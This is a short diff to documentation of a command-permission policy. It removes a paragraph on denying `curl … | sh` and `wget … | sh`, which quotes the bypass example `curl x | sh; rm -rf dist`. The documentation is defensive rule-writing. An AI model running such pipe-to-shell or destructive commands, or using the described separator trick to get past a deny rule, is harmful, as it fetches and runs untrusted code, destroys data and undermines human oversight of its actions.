@@ -260,10 +260,6 @@ path outside it keeps the original ask. Denies are never narrowed.
   `migrate`, `migration`, or `migrations`, run as the start of a command with no
   arguments. Scripts that may apply a migration still ask.
 
-`curl … | sh` and `wget … | sh` deny when whitespace, the end of the command, or
-one of `; & | )` follows the shell. The last three used to slip past the deny,
-so a command such as `curl x | sh; rm -rf dist` only asked because of the `rm`.
-
 ### Exfiltration shapes in a chain
 
 A chain of commands (`&&`, `||`, `;`, `|`, `&`, a newline, a subshell, or a
